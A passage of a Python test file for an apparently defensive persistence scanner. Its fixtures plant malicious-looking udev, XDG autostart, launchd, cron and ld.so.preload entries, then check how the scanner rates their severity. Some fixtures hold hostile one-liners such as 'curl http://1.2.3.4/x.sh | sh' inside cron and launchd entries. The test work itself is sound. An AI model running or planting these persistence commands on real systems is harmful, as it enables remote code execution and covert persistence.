        'ACTION=="add", SUBSYSTEM=="usb", RUN+="/tmp/.x/payload.sh"\nACTION=="add", RUN+="/usr/bin/logger usb"\n')
    assert ps.parse_udev_rules('A, RUN+="/a/b c" , RUN{program}+="/x"') == ["/a/b c", "/x"]
    udev = ps.collect_udev(lp)
    assert len(udev) == 2
    assert sorted(sev(e, exists=lambda p: True) for e in udev) == [S.INFO, S.MEDIUM]
    (lp.homes[0] / ".config" / "autostart" / "x.desktop").write_text(
        "[Desktop Entry]\nName=X\nExec=/tmp/.hidden/run %U\nHidden=false\n")
    (lp.homes[0] / ".config" / "autostart" / "off.desktop").write_text("[Desktop Entry]\nExec=/tmp/y\nHidden=true\n")
    xdg = {e["name"]: e for e in ps.collect_xdg_autostart(lp)}
    assert xdg["x.desktop"]["command"] == "/tmp/.hidden/run" and xdg["off.desktop"]["enabled"] is False
    assert sev(xdg["x.desktop"], exists=lambda p: True) == S.MEDIUM and assess(xdg["off.desktop"]) == []


def test_launchd_plist(tmp_path):
    d = tmp_path / "LaunchAgents"
    d.mkdir()
    (d / "com.evil.plist").write_bytes(plistlib.dumps({"Label": "com.evil", "ProgramArguments": ["/bin/bash", "-c", "curl -s http://1.2.3.4/a | bash"],
                                                       "RunAtLoad": True}))
    (d / "com.tmp.plist").write_bytes(plistlib.dumps({"Label": "com.tmp", "ProgramArguments": ["/tmp/.x/run"], "RunAtLoad": True}))
    (d / "com.ok.plist").write_bytes(plistlib.dumps({"Label": "com.ok", "ProgramArguments": ["/Applications/Foo.app/Contents/MacOS/foo", "--bg"]}))
    (d / "com.off.plist").write_bytes(plistlib.dumps({"Label": "com.off", "ProgramArguments": ["/tmp/x"], "Disabled": True}))
    (d / "broken.plist").write_text("not a plist")
    entries = {e["name"]: e for e in ps.collect_launchd([d])}
    assert set(entries) == {"com.evil.plist", "com.tmp.plist", "com.ok.plist", "com.off.plist"}
    ex = lambda p: True
    assert sev(entries["com.evil.plist"], exists=ex) >= S.MEDIUM
    assert sev(entries["com.tmp.plist"], exists=ex) == S.MEDIUM
    assert sev(entries["com.ok.plist"], exists=ex) == S.INFO
    assert assess(entries["com.off.plist"]) == []
    mac = ps.make_entry("launchd", "x", "m", "/usr/bin/osascript -e 'do shell script \"x\"'", mac=True)
    assert sev(mac, exists=ex) >= S.MEDIUM


# --------------------------------------------------------------------------- inventory / diff / live run

def test_diff_entries():
    a = ps.make_entry("cron", "/etc/crontab", "x", "/bin/a")
    b = ps.make_entry("cron", "/etc/crontab", "y", "/bin/b")
    c = ps.make_entry("cron", "/etc/crontab", "y", "/bin/b2")
    added, removed = ps.diff_entries([a, b], [a, c])
    assert added == [c] and removed == [b]
    assert ps.diff_entries([a], [a]) == ([], [])


def test_entry_schema():
    e = ps.make_entry("registry_run", "HKCU\\Run", "n", r'"C:\x y\z.exe" -a', enabled=True)
    assert {"type", "location", "name", "command", "path", "enabled"} <= set(e)
    assert e["path"] == r"C:\x y\z.exe"


def test_collect_entries_runs_on_this_os():
    entries = ps.collect_entries()
    assert isinstance(entries, list)
    for e in entries:
        assert {"type", "location", "name", "command", "path", "enabled"} <= set(e)


@posix_only
def test_scanner_end_to_end_on_linux_tree(monkeypatch, linux_tree, ctx):
    root, lp = linux_tree
    (lp.etc / "cron.d" / "evil").write_text("* * * * * root curl http://1.2.3.4/x.sh | sh\n")
    (lp.etc / "cron.d" / "ok").write_text("0 2 * * * root /usr/bin/true\n")
    (lp.etc / "ld.so.preload").write_text("/tmp/.x/evil.so\n")
    monkeypatch.setattr(ps, "LinuxPaths", lambda: lp)
    out = list(ps.PersistenceScanner().run(ctx))
    findings = [o for o in out if isinstance(o, Finding)]
    checks = [o for o in out if isinstance(o, CheckResult)]
    rules = {f.rule_id for f in findings}
    assert {"AEG-PERS-CRON", "AEG-PERS-LDPRELOAD"} <= rules
    assert all(f.scanner == "persistence" for f in findings if f.rule_id.startswith("AEG-PERS"))
    assert checks and checks[-1].check_id == "AEG-PERS-CHK-AUTOSTART" and checks[-1].status == "fail"
    assert not any("ok" in f.location and f.rule_id == "AEG-PERS-CRON" and "true" in f.evidence.get("command", "") for f in findings)


def test_scanner_runs_on_real_system_without_exceptions(ctx):
    out = list(ps.PersistenceScanner().run(ctx))
    assert out and isinstance(out[-1], CheckResult)
    assert all(isinstance(o, (Finding, CheckResult)) for o in out)


def test_scanner_metadata():
    from aegis.scanners.base import REGISTRY
    assert REGISTRY["persistence"] is ps.PersistenceScanner
    assert ps.PersistenceScanner.name == "persistence"


def _balanced(script: str) -> bool:
    """Brace/paren/bracket and single-quote balance of a PowerShell snippet."""
    stack, in_q = [], False
    pairs = {")": "(", "]": "[", "}": "{"}
    for ch in script:
        if ch == "'":
            in_q = not in_q
        elif in_q:
            continue
        elif ch in "([{":
            stack.append(ch)
        elif ch in pairs:
            if not stack or stack.pop() != pairs[ch]:
                return False
    return not stack and not in_q


def test_powershell_snippets_are_well_formed(monkeypatch):
    from aegis.scanners import network as nw, processes as pr
    captured = []
    monkeypatch.setattr(ps, "IS_WINDOWS", True)
    monkeypatch.setattr(pr, "IS_WINDOWS", True)
    monkeypatch.setattr(ps, "powershell_json", lambda script, timeout=0: captured.append(script))
    monkeypatch.setattr(pr, "powershell_json", lambda script, timeout=0: captured.append(script))
    ps.resolve_lnks([r"C:\a's\b.lnk"])
    pr.authenticode_batch([r"C:\Users\o'brien\x.exe", r"C:\y.exe"])
    scripts = captured + [ps.WMI_SCRIPT, nw.ROOT_SCRIPT, nw.SMB_SCRIPT]
    assert len(scripts) == 5
    for s in scripts:
        assert _balanced(s), s
        assert '"' not in s  # survives Windows command-line quoting unchanged
    assert "o''brien" in captured[1] and "a''s" in captured[0]  # single quotes escaped by doubling


def test_service_missing_target_only_for_autostart_services():
    manual = ps.service_entry("Old", {"ImagePath": r"C:\Gone\old.exe", "Type": 0x10, "Start": 3}, {})
    auto = ps.service_entry("Old2", {"ImagePath": r"C:\Gone\old.exe", "Type": 0x10, "Start": 2}, {})
    assert sev(manual, exists=lambda p: False) == S.INFO
    assert sev(auto, exists=lambda p: False) == S.LOW


def test_weak_scan_hint_does_not_escalate_but_dropper_pattern_does():
    """Real-Windows CI regression: an unsigned agent in ProgramData (MEDIUM) plus a LOW
    high-entropy hint must stay MEDIUM, not HIGH."""
    loc = ps.Reason(S.MEDIUM, "runs from a user-writable location", "location")
    weak = ps.Reason(S.LOW, "target flagged by scanner: High-entropy sections", "scan")
    assert ps.combined_severity([loc, weak]) == S.MEDIUM
    strong = ps.Reason(S.MEDIUM, "target flagged by scanner: Suspicious script", "scan")
    assert ps.combined_severity([loc, strong]) == S.HIGH


def test_windows_service_and_vendor_names_are_not_random():
    for name in ("dnsrslvr.dll", "appmgmts.dll", "wmpnscfg.exe", "chrmstp.exe"):
        assert not ps.looks_random(name), name
    # Service *key* names can be vowel-free ("NgcCtnrSvc"); the target living in System32 clears them.
    svc = {"type": "service", "location": r"HKLM\SYSTEM\CurrentControlSet\Services\NgcCtnrSvc", "name": "NgcCtnrSvc",
           "command": r"%SystemRoot%\system32\svchost.exe -k LocalServiceNoNetwork",
           "path": r"C:\Windows\System32\ngcctnrsvc.dll", "enabled": True,
           "meta": {"svc_type": 32, "start": 3, "user": "LocalSystem"}}
    assert not [r for r in assess(svc) if r.kind == "random"]
    e = run_entry(r"C:\Program Files\Mozilla Firefox\default-browser-agent.exe",
                  name="Firefox Default Browser Agent 308046B0AF4A39CB")
    assert not [r for r in assess(e) if r.kind == "random"]


def test_bootexecute_default_variants():
    for v in ("autocheck autochk *", "autocheck autochk /q /v *", "autocheck autochk /k:C *"):
        assert ps.BOOT_DEFAULT.match(v), v
    for v in ("autocheck autochk * evil", "autocheck evil.exe *"):
        assert not ps.BOOT_DEFAULT.match(v), v
